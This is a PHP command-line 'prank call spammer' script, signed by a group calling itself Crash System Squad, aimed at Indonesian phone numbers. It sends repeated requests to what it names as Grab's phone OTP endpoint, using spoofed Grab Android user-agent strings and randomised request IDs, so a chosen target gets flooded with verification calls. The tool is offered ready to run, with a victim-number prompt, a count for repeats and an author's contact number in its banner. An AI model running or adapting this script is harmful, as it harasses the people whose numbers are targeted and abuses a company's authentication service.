/*Modified by Tn-Cr4sh*/

<?php ?><?php
system('clear');
function get() {
    return trim(fgets(STDIN));
}
class prankcall {
    public function __construct($no) {
        $this->number = $no;
    }
    private function get() {
        return trim(fgets(STDIN));
    }
    private function correct($no) {
        $cek = substr($no, 0, 2);
        if ($cek == "08") {
            $no = "62" . substr($no, 1);
        }
        return $no;
    }
    private function ekse() {
        $no = $this->correct($this->number);
        $rand = rand(0123456, 9999999);
        $rands = $this->randStr(12);
        $post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
        $h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
        $h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
        $h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
        $h[] = "Content-Type: application/x-www-form-urlencoded";
        $h[] = "Content-Length: " . strlen($post);
        $h[] = "Host: api.grab.com";
        $h[] = "Connection: close";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $x = curl_exec($ch);
        curl_close($ch);
        $ekse = json_decode($x, true);
        if (empty($ekse['challengeID'])) {
            echo "Gagal
";
        } else {
            echo "Sukses
";
        }
    }
    private function loop($many, $sleep = null) {
        $a = 0;
        $no = $this->correct($this->number);
        while ($a < $many) {
            $rand = rand(0123456, 9999999);
            $rands = $this->randStr(12);
            $post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
            $h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
            $h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
            $h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
            $h[] = "Content-Type: application/x-www-form-urlencoded";
            $h[] = "Content-Length: " . strlen($post);
            $h[] = "Host: api.grab.com";
            $h[] = "Connection: close";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $x = curl_exec($ch);
            curl_close($ch);
            $ekse = json_decode($x, true);
            if (empty($ekse['challengeID'])) {
                continue;
            } else {
                $nn = $a + 1;
                echo "\e[97m[\e[93m$nn\e[93m\e[97m]\e[97m Sukses 
";
                $a++;
            }
            if ($sleep != null) sleep($sleep);
            if ($a >= $many) echo "
Completed!
";
        }
    }
    private function randStr($l) {
        $data = "abcdefghijklmnopqrstuvwxyz1234567890";
        $word = "";
        for ($a = 0;$a < $l;$a++) {
            $word.= $data{rand(0, strlen($data) - 1) };
        }
        return $word;
    }
    public function run() {
        while (true) {
            echo "\e[97m[?] Mode Banyak (y/n) ==> \e[92m";
            $loop = $this->get();
            if ($loop == "y" OR $loop == "n") {
                break;
            } else {
                echo "\e[97mJawab Lah Salah Satu Wahai Sobat Khuu
";
                continue;
            }
        }
        if ($loop == "y") {
            echo "\e[97m[?] JumlahSpam Korban ==> \e[92m";
            $many = $this->get();
            $this->loop($many);
        } else {
            $this->ekse();
        }
    }
}
echo "  
";
echo "\e[93m<<< PRANKER CALL SPAMMER >>>
";
echo "
\e[91m+.                                   
:m+                                  
 +d` -`                              
` -s .d:                             
-y.:s +h             `..`            
 oh ss`:/         `+hdmmdy:          
  ./`dy`o+`      -dmmmmmmmmy`        
   -+:mh+y+.    -mmmmmmmmmmmy        
   `dyody--`    ymmmmmmmmmmmm/    -- 
    :` :mh-y:   mmmmmmmmmmmmms   y/-:
        -dsh-   mmmmmmmmmmmmms   y/  
         .dd`   smdmmmmmmmmmm:   -d. 
         `mhs`  .dsymmmmmmody     ho 
         `mhyy/- -hmmmmmmmms``://odo 
         ssdssho `-smmmmmd+` -/.:hsh.
         h/.oydhyydmmmdmmmmhyyyyy:`h:
         :y+--:smdmmhm+dhmmdy+:--:ss`
          `:oooohmmd-m/ho+mh+oooo+-  
               `ymm:-m-yy ymh:       
             `:yshy /m.od :msho.     
           -+ys- do sd /m.`m/`/ys:`  
         .ss:`   yo ds .m+.m-   -+y/ 
        .d/  :/: /d/m-  sh+d`.//. `ho
        /h   ``h-`hmo   .dm: y/ `  /d
        -d-```/h` ym-    ym. +s.```ss
         -oooo/` `mso   -+mo  -ooos+`
                 `m/      do         
                  d+      m/         
                  +h     :d`         
                  `h-    y/          
                   .y   :s           
                    -: `+            
";
echo "\e[92mBerfikirlah sebagaimana seorang pemula,
Maka dunia ini akan terbuka untukmu. Trust us!

we are \e[91mCRASH SYSTEM SQUAD 
";
echo "\e[97m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 \e[97mModified by  : \e[91mTn-Cr4sh~
 \e[97mTeam         : \e[92mCrash System Squad
 \e[97mNumber       : \e[93m+62895363649859
 \e[97mSpecial to   : \e[90m-All member Crash System Squad
                -All of Cyber Indonesia
\e[97m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
";
system('echo');
sleep('0.4');
echo "\e[97m[?] Masukan No Target ==>\e[92m ";
$no = get();
$n = new prankCall($no);
$n->run();
